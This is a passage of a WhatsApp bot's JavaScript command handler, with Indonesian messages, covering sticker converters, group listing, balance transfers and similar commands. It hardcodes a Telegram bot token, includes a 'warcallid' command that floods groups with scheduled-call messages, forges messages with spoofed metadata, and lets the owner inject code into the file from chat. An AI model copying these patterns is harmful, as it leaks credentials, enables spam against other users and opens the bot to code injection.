                body: JSON.stringify({
                    "from": {
                        "email": "notifier@boyne.dev",
                        "name": `jangkrik`
                    },
                    "to": [{
                        "email": args[0],
                        "name": `uhh`
                    }],
                    "subject": "Email Verification",
                    "html": `<div
        style="width: 600px; height: 500px;margin: auto;font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;">
        <div
            style="line-height: 2; letter-spacing: 0.5px; position: relative; padding: 10px 20px; width: 540px;min-height: 360px; margin: auto; border: 1px solid #DDD; border-radius: 14px;">
            <tt>Halo <b> 👋🏻</b></tt>
            <p>
                Konfirmasi Emailmu Supaya Dapat Menggunakan Fitur Bot, Klik <b>Verifikasi Akun</b> untuk konfirmasi akun mu, Dalam 3 menit tautan itu akan hangus
            </p>
          <div align="center">
            <img src="https://raw.githubusercontent.com/innng/innng/master/assets/kyubey.gif" width="200px" alt="kii">
           </div>
            <a style="cursor: pointer;text-align: center; display: block; width: 160px; margin: 30px auto; padding: 10px 10px; border: 1px solid #00FFFA; border-radius: 14px; color: white; text-decoration: none; font-size: 1rem; font-weight: 500; background-color: blue;"
                href="https://wa.me/?text=">Verifikasi Akun</a>
            <span style="display: block;">Jika Kamu Tidak Melakukan Tindakan Itu,
Silakan Abaikan <br>Email Ini
<br>
<br>
Jika Kamu Memiliki Masalah, Silahkan Hubungin Saya Via <span
                    style="color: #4D96FF;"><a href="https://api.whatsapp.com/send?phone=6283877118785">WhatsApp</a></span></span>
            <span style="display: block;"><br>By,<br>KiiCode</span>
        </div>
    </div>
    `,
                    "category": "Notification"
                })
            })
            .then(response => response.json())
         return reply('```✅ Email verifikasi Sudah Terkirim \nCek Email Untuk Melanjutkan Verifikasi!```')

break
case 'telegram':
if (!text) return reply('masukan tag/username telegram anda')
const token = '6512411455:AAGEVs_xNptRn4KaiFTaWKOjwmdFx4DEmpc';
const chatId = text;
const message = 'Hello from your Telegram bot!';

const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;

fetch(apiUrl, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    chat_id: chatId,
    text: message,
  }),
})
break
case 'cekgc': {
if (!isCreator && !isOwner && !isPremium)
if (!args[0]) return reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid")
znn.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」

▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}
▸ ID Group : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}@g.us
▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

© ${global.fake}`
try {
pp = await znn.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
znn.sendFile(from, pp, "", m, { caption: tekse })
})
}
break
case 'listpc': {
if (!isCreator && !isOwner && !isPremium) return reply(mess.owner)
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${nama}\n*User :* @${i.split('@')[0]}\n*Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
znn.sendteks(m.chat, teks, m)
}
break
case 'getdb':
if (!isCreator && !isOwner) return reply('khusus dalwin ( ◜‿◝ )♡')
znn.sendMessage(from, {document: fs.readFileSync('./database/user.db.json'), caption: 'Database Bot', mimetype: 'application/json', fileName: 'database.json' }, {quoted: m})
break
case 'warcallid': {
if (!isCreator && !isOwner && !isPremium) return reply(mess.owner)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} Contoh : ${prefix+command} ID group|Awikawok`)
if (!q) return reply(`Contoh penggunaan 123xxxxx@g.us|Pesannya`)
let nummess = q.replace(/[^0-9]/g, '')+'@g.us'
let ppp = q.split('|')[1]
var call = { 
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: ppp,
}}
znn.relayMessage(nummess, call, {})
await delay(10)
znn.sendMessage(from, {text: `Sukses kirim pesan ke ${nummess} tuan!`}, {quoted: m})
}
break
case 'listgc': {
if (!isCreator && !isOwner) return reply(mess.owner)
let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let tekslistgc = `乂 *L I S T  G R O U P  C H A T*\n\n`
tekslistgc += `  ◦  Total Group : ${anu.length} Group\n`
for (let e of anu) {
let metadata = await znn.groupMetadata(e)
tekslistgc += `╭ *Nama :* ${metadata.subject}\n`
tekslistgc += `│ *Owner Grup :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n`
tekslistgc += `│ *ID :* ${metadata.id}\n`
tekslistgc += `│ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
tekslistgc += `╰  *Member :* ${metadata.participants.length}\n\n`
tekslistgc += `──────────────────────\n\n`
}
reply795(tekslistgc)
            }
        break
case "opsichatpc":
if (!isCreator) return reply('khusus owner (´-﹏-`；)')
let titlenya = `PLEASE SELECT`
chat33 = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
if (args[0] == "pin") {
await znn.chatModify({ pin: true }, chat33)
} else if (args[0] == "unpin") {
await znn.chatModify({ pin: false }, chat33)
} else if (args[0] == "archive") {
await znn.chatModify({ archive: true, lastMessages: [m] }, chat33)
} else if (args[0] == "unarchive") {
await znn.chatModify({ archive: false, lastMessages: [m] }, chat33)
} else if (args[0] === "mute") {
await znn.chatModify({ mute: "Infinity" }, chat33, [])
} else if (args[0] === "unmute") {
await znn.chatModify({ mute: null }, chat33, [])
} else if (args[0] === "read") {
await znn.chatModify({ markRead: true, lastMessages: [m] }, chat33)
} else if (args[0] === "unread") {
await znn.chatModify({ markRead: false, lastMessages: [m] }, chat33)
} else if (args[0] == "block") {
await znn.updateBlockStatus(chat33, 'block')
} else if (args[0] == "unblock") {
await znn.updateBlockStatus(chat33, 'unblock')
} else if (args[0] == "delete") {
await znn.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp.low }]}, chat33).catch((err) => reply(`Berhasil Delete Chat`))
} else {
znn.sendPoll(m.sender, titlenya, [`${command} pin ${chat33}`,`${command} unpin ${chat33}`,`${command} archive ${chat33}`,`${command} unarchive ${chat33}`,`${command} mute ${chat33}`,`${command} unmute ${chat33}`,`${command} read ${chat33}`,`${command} unread ${chat33}`,`${command} block ${chat33}`,`${command} unblock ${chat33}`,`${command} delete ${chat33}`])
}
break

case 'welcome':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (args[0] == 'on'){
if (global.welcome) return reply('di aktifkan sebelumnya!')
global.welcome = true
reply('Fitur welcome telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.welcome) return reply('sudah mati sebelumnya!')
global.welcome = false
reply('Fitur welcome telah di matikan')
} else reply('on / off')
break
case 'getcase':
if (!isCreator&&!isOwner) return reply(mess.owner)
if (!q) return reply795(`Contoh penggunaan: ${prefix+command} menu`)
const getcase = (cases) => {
return "case "+`'${cases}'`+fs.readFileSync('./case.js').toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply795(`${getcase(q)}`)
break
case 'getfunc':
if (!isCreator&&!isOwner) return reply(mess.owner)
if (!q) return reply795(`Contoh penggunaan: ${prefix+command} reply`)
const getfunc = (funcc) => {
return "const "+`'${funcc}'`+fs.readFileSync('./case.js').toString().split('const \''+funcc+'\'')[1].split('')
}
reply795(`${getfunc(q)}`)
break
case 'addcase': {
                if (!isCreator) return reply('buat owner dibilang')
    if (!text) return reply('Mana case nya');
    const fs = require('fs');

// Nama file yang akan dimodifikasi
const namaFile = './case.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        reply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break;
case 'gimage': {
if (!text) return reply(`Example : ${prefix + command} carry minati`)
reply(mess.wait)
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
znn.sendMessage(m.chat, { image: { url: images}, caption: `*Query* : ${text}\n*Media Url* : ${images}`}, { quoted: m })
})
}
break

//==================================================================
            
             
             

             







































// FITUR CONVERTER
case 'avatar': case 'smeta': {
async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const {
    default: {
      Image
    }
  } = await import('node-webpmux')
  const img = new Image()
  const json = {
    'sticker-pack-id': 'znn Pragmatic',
    'sticker-pack-name': 'znn Zuberg',
    'sticker-pack-publisher': 'Project znnzation',
    'emojis': categories,
    'is-avatar-sticker': 1,
    ...extra
  }
  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
  let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
  let exif = Buffer.concat([exifAttr, jsonBuffer])
  exif.writeUIntLE(jsonBuffer.length, 14, 4)
  await img.load(buffer)
  img.exif = exif
  return await img.save(null)
}
function makeid(length) {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
  var stiker = false
  try {
    let [packname, ...author] = q.split('|')
    let mime = m.quoted.mimetype || ''
    if (!/webp/.test(mime)) return reply('Reply sticker!')
    //let img = await q.download()
    let img = await znn.downloadAndSaveMediaMessage(quoted, makeid(5))
    if (!img) return reply('Reply a sticker!')
    var stiker = await addExifAvatar(img, `${global.packname}`, `${global.author}`)
  } catch (e) {
    console.error(e)
    if (Buffer.isBuffer(e)) stiker = e
  } finally {
    if (stiker) znn.sendMessage(m.chat, {
      sticker: stiker
    }, {
      quoted: floc
    })
    else throw 'Conversion failed'
  }
}
break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return reply(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
znn.downloadAndSaveMediaMessage(quoted, "gifee")
znn.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await znn.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await znn.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
reply(`Photo/Video?`)
}
}
break
case 'toptv':{
if (!m.quoted) return reply('```Reply Videonya Untuk Di Jadikan Ptv [!]```')
if (!isVideo || !isQuotedVideo) {
const toptvv = {key: {fromMe: true, participant: `6283897387848@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"} : {})}, message: {extendedTextMessage: {text: `Powered By znn`}}}
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({"ptvMessage": ppt, caption: `done banh`, fileLength: 9999999999 }), { userJid: from})
znn.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break
case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await znn.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
znn.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
case 'remini':
case 'hd':
case 'jadihd':{
if (!m.quoted) return reply795(`Reply gambar ${prefix}${command}`)
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
znn.sendMessage(m.chat, { image: proses, caption:"Nihh Gambarnya jadi HD\n\n-$5.000"}, { quoted: m})
}
break
case 'say': case "tts": case "gtts":{
if (!q) return reply('Masukan Text!\n. contoh: tts jawa hitam')
const gtts = require("./lib/gtts")(`ja`, `${q}`)
var bby = args.join(' ')
let ranm = getRandom('.mp3')
let rano = getRandom('.ogg')
bby.length > 500 ? reply('Teks nya terlalu panjang !')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
let buff = fs.readFileSync(rano)
if (err) return reply('Error Njir')
znn.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: true },{ quoted: m })
fs.unlinkSync(rano)
})
})
}
break
case 'smeme':
var atas = text.includes('-') ? text.split('-')[0] ? text.split('-')[0] : text : '-'
var bawah = text.includes('-') ? text.split('-')[1] ? text.split('-')[1] : '' : text
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *text atas-text bawah*\n• example : ${prefix+command} znn-Bot`)
if (text.length > 30) return reply(`Teksnya kebanyakan! kalo make ngotak dikit kontol!`)
if (/image/.test(mime)) {
reply(global.mess.wait)
var media = await znn.downloadAndSaveMediaMessage(quoted, Date.now())
var media_url = await global.telegraPH(media)
var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
znn.sendImageAsSticker(from, meme_url, fpayment2, {packname: '© 𝙰𝚄𝚃𝙷𝙾𝚁 𝙹𝙾𝙼𝙾𝙺', author: '𝙳𝙰𝚁𝚆𝙸𝙽 𝙱𝙾𝚃'})
await fs.unlinkSync(media)
} else reply(`Kirim gambar dengan caption ${prefix+command} text atas-text bawah atau balas gambar yang sudah dikirim`)
break
case 'jadianime':
if (!isCreator && !isOwner && !isPremium) return reply(mess.owner)
if (!isGroup) return onlyGroup()
if (isImage && !isQuotedImage) return reply(`Kirim gambar lalu reply ${prefix + command} atau tag gambar yang sudah dikirim`)
reply(mess.wait)
try {
        const quotedMsg = await znn.downloadAndSaveMediaMessage(quoted)
        const media = await znn.downloadAndSaveMediaMessage(quoted)
        const buffer = Buffer.from(media.data, 'base64');
        const cloud = await uploader(buffer)        
        const anime = await fetch(BASE_URL + `/toanime` + `?url=${cloud}`).then(response => response.json());
        console.log(chalk.bgGreen.black(`> ${anime.url.img_crop_single}`));
        const imgs = await fetch(anime.url.img_crop_single).then(res => res.buffer())
        const response = new MessageMedia((await fromBuffer(imgs)).mime, imgs.toString("base64"))
        await client.sendMessage(message.from, response, { caption: `✔️ Done`, quotedMessage: message.id._serialized });               
    } catch (e) {
      console.log(e);
    }
break
case  'qc':{
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const avatar = await znn.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)
const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 800,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await znn.imgToSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.namaownernya, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break 
case  'qcimg':{
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
//const username = await znn.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await znn.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
znn.sendMessage(from,{image: buffer},{quoted : m})
})
}
break
case 's': case 'stiker': case 'sticker': {
if (/image/.test(mime)) {
let media = await znn.downloadAndSaveMediaMessage(quoted, + new Date * 1)
znn.sendImageAsSticker(from, media, fpayment2, {packname: '© 𝙰𝚄𝚃𝙷𝙾𝚁 𝙹𝙾𝙼𝙾𝙺', author: '𝙳𝙰𝚁𝚆𝙸𝙽 𝙱𝙾𝚃'})
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if (quoted.seconds > 11) return reply795('Maksimal 10 detik!')
let media = await znn.downloadAndSaveMediaMessage(quoted, + new Date * 1)
znn.sendVideoAsSticker(from, media, fpayment2, {packname: '© 𝙰𝚄𝚃𝙷𝙾𝚁 𝙹𝙾𝙼𝙾𝙺', author: '𝙳𝙰𝚁𝚆𝙸𝙽 𝙱𝙾𝚃'})
await fs.unlinkSync(media)
} else reply795(`Kirim atau reply gambar dengan caption ${prefix+command}`)
}
break
case 'tr':
case 'translate':{
let translate = require('translate-google-api')
let defaultLang = 'en'
let tld = 'cn'
let toks = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim()

let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && m.quoted && m.quoted.text) text = m.quoted.text
let result
try {
result = await translate(`${text}`, {to: lang})
} catch (e) {
result = await translate(`${text}`, {to: defaultLang,})
reply(toks)
} finally {
reply(result[0])
}
}
break
case 'tomp4': case 'tovideo': {
var media = await znn.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
znn.sendMessage(from, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: fkontak })
}
break
case 'tovn':{
if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
znn.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: true }, {quoted: m })
}
break
case 'toaudio':{
if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
znn.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: false }, {quoted: m })
}
break
case 'tomp3': {
if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
znn.sendMessage(from, {audio: dl, mimetype:'audio/mpeg', ptt:false, contextInfo:{  externalAdReply: { showAdAttribution: false,
mediaType:  1,
mediaUrl: 'https://youtube.com/@bg-znn',
title: `Converter mp3`,
sourceUrl: `${global.saluran}`,
thumbnail: ppnyauser
}
}})
}
break
//=================================================//
case 'togif': {
if (!isGroup) return onlyGroup()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./lib/uploader')
let media = await znn.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await znn.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let media = await znn.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'toqr':{
if (!q) return reply('Masukin Link Atau Text (´-﹏-`；)')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
let qyuer = await qrcode.toDataURL(q, { scale: 35 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
let buff = getRandom('.jpg')
await fs.writeFileSync('./'+buff, data)
let medi = fs.readFileSync('./' + buff)
await znn.sendMessage(from, { image: medi, caption:"Ini Diahh (￣ヘ￣;)"}, { quoted: m })
setTimeout(() => { fs.unlinkSync(buff) }, 10000)
}
break

















  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
// FITUR SHOP
 /*
            case "nokos-wa-malay", "nokosmalay":{
      //     if (new Date - global.db.data.users[m.sender].otplast > + 60000) {
       //     user.otplast = new Date * 1
//if (!isPrems) return m.reply('Fitur ini khusus Premium')
if (userz.saldo < nokosmalay) {
  m.reply('Saldo User Anda Kurang!. Silahkan Melakukan Deposit Terlebih Dahulu')
  } else if(userz.saldo > nokosmalay) {
    var res = await fetchJson(`https://otpku.com/api/json.php?api_key=${apikeyotp}&action=order&service=313&operator=any`)
    var ressa = await fetchJson(`https://otpku.com/api/json.php?api_key=${apikeyotp}&action=set_status&id=${ress.id}&status=1`)
    if (res.status == false) return m.reply(res.data.msg)
    await sleep(1000)
    var ress = res.data
    try {
    m.reply(`${htki}*DETAIL ORDER*${htka}
    
    》 id: ${ress.id}
    》 service name: ${ress.service_name}
    》 nokos: ${ress.number}
    》 region : Malaysia
    
     info selengkapnya
    silahkan ketik .getorder`)
global.db.data.users[who].saldo -= nokosmalay
    user.otpcancel = new Date * 1
        m.reply(`Anda menggunakan saldo sebesar Rp{nokosmalay}`)
} catch (e) {
    if (res.messages == false) return m.reply('Sedang dalam proses restock, mohon tunggu sebentar.')
    m.reply(`${res.messages}`)
    }
  }
          //  } else m.reply(`Kamu sudah *Mengambil Otp* Saat Ini..\nMohon tunggu ${waktuh} untuk bisa *Mengambil Otp* kembali..`)
}
            break
            case "order":{
     //      if (new Date - global.db.data.users[m.sender].otplast > + 60000) {
         //       user.otplast = new Date * 1
if (!isROwner) return m.reply('Hadeh lu siape? Owner gw?')
let q = text
if (!q) return m.reply(`id layanannya?`)
var res = await fetchJson(`	https://otpku.com/api/json.php?api_key=${apikeyotp}&action=order&service=${q}&operator=any`)
var ressa = await fetchJson(`https://otpku.com/api/json.php?api_key=${apikeyotp}&action=set_status&id=${q}&status=1`)
if (res.status == false) return m.reply(res.data.msg)
await sleep(1000)
let ress = res.data
m.reply(`${htki}*DETAIL ORDER*${htka}

》 id: ${ress.id}
》 service name: ${ress.service_name}
》 nokos: ${ress.number}
》 category : ${ress.category}

 info selengkapnya
silahkan ketik .getorder`)
                user.otpcancel = new Date * 1
                var ressa = await fetchJson(`https://otpku.com/api/json.php?api_key=${apikeyotp}&action=set_status&id=${ress.id}&status=1`)
       //     } else m.reply(`Kamu sudah *Mengambil Otp* Saat Ini..\nMohon tunggu ${waktuh} untuk bisa *Mengambil Otp* kembali..`)
}
break
case "getorder":{
//if (!isPrems) return m.reply('Fitur ini khusus Premium')
let kode = await fetchJson(`https://otpku.com/api/json.php?api_key=${apikeyotp}&action=active_order`)
if (kode.succes == false) return m.reply(kode.data.msg)
await sleep(1000)
let GG = 0
for (let x of kode.data){
teks =`${htki}STATUS ORDER${htka}

》 id: ${x.id}
》 number : ${x.number}
》 sms otp : ${x.otp}\n\n`
}
// let teks =`*MENGAMBIL OTP*\n\n- ID layanan: ${x.order_id}\n- Nomor: ${x.number}\n- OTP: ${x.sms}\n\n*!Jika Undefined berarti tidak ada otp masuk*`
let cap = teks + '\n\n## *Jika Kosong Tidak ada otp Masuk* ##'
m.reply(cap)
}
break

*/
case 'sendpayment': {
async function dana(aplikasi, nomer, jumlah, tujuan) {
const axios = require('axios');
const fs = require('fs');
    try {
        let response = await axios.get(`https://api.neoxr.eu/api/topup-${aplikasi}`, {
            params: {
                number: nomer,
                amount: jumlah
            }
        });

        let qrImageData = response.data.data.qr_image;
        
        // Dekode data base64 menjadi buffer
        let qrImageBuffer = Buffer.from(qrImageData, 'base64');

        // Simpan buffer sebagai file gambar (opsional)
        fs.writeFileSync('qr_image.png', qrImageBuffer);
        
let paycap = `*TRANSFER SALDO*
Silahkan untuk mekakukan prabayar dengan ${aplikasi} dengan qris di atas, scan qris di atas di aplikasi prabayar kamu

   ID : ${response.data.data.id}
   Code : ${response.data.data.code}
   Number : ${response.data.data.number}
   Price : ${response.data.data.price_format}
   Expired : ${response.data.data.expired_at}`

        // Kirim gambar sebagai pesan
        znn.sendMessage(tujuan ? tujuan + `@s.whatsapp.net` : m.chat, { image: qrImageBuffer, caption: paycap }, { quoted: fcall });
    } catch (error) {
        reply('An error occurred while processing your request.');
    }
}

let aplikasi = args[0]
let nomer = args[1]
let jumlah = args[2]
let tujuan = args[3]
if (!aplikasi && !nomer && !jumlah) return reply(`Upss penggunaan salah, ikuti step dibawah\n\nexample : sendpayment dana 62849383893 900000`)
dana(aplikasi, nomer, jumlah, tujuan)
}
break

case 'transfer': case 'tf':{
if (!isGroup) return reply(mess.group)
if (m.quoted) {
if (db.users[froms] == undefined) return reply('User tidak terdaftar didalam database!')
if (froms == sender) return reply('*[ Transfer ]* failed')
if (!args[0]) return reply(`*[ Transfer ]* masukkan nominal nya!`)
if (isNaN(args[0])) return reply(`*[ Transfer ]* nominal harus berupa angka!`)
if (Number(args[0]) >= 9999999999999999) return reply795('Kebanyakan!')
let count = args[0].length > 0 ? Math.min(9999999999999999, Math.max(parseInt(args[0]), 1)) : Math.min(1)
if (count < 100) return reply795('*[ Transfer ]* minimal 100 untuk bisa transfer!')
if (cekSaldo(sender, db_saldo) >= count * 1) {
minSaldo(sender, count * 1, db_saldo)
addSaldo(m.quoted.sender, count * 1, db_saldo)
reply795(`*SUCCESS TRANSFER*\n\n${tag} Sukses transfer saldo sebesar *Rp. ${count}* kepada @${m.quoted.sender.split('@')[0]}`)
} else reply(`Saldo kamu tidak mencukupi untuk mentransfer balance sebesar ${count}`)
} else if (q) {
let nominalnya = args[0].toString()
let tagnya = q.slice(args[0].length + 1, q.length).replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!(tagnya in users)) return reply795('User tidak terdaftar didalam database!')
if (tagnya == sender) return reply795('Tidak bisa transfer ke diri sendiri!')
if (!nominalnya) return reply795(`Masukkan nominal nya!`)
if (isNaN(nominalnya)) return reply795(`Nominal harus berupa angka!`)
if (Number(nominalnya) >= 9999999999999999) return reply795('Kebanyakan!')
let count = nominalnya.length > 0 ? Math.min(9999999999999999, Math.max(parseInt(nominalnya), 1)) : Math.min(1)
if (count < 100) return reply795('Minimal 100 untuk bisa transfer!')
if (cekSaldo(sender, db_saldo) >= count * 1) {
minSaldo(sender, count * 1, db_saldo)
addSaldo(tagnya, count * 1, db_saldo)
reply(`*SUCCESS TRANSFER*\n\n${tag} Sukses transfer balance sebesar *$${count}* kepada @${tagnya.split('@')[0]}`)
} else reply(`Balance kamu tidak mencukupi untuk mentransfer balance sebesar ${count}`)
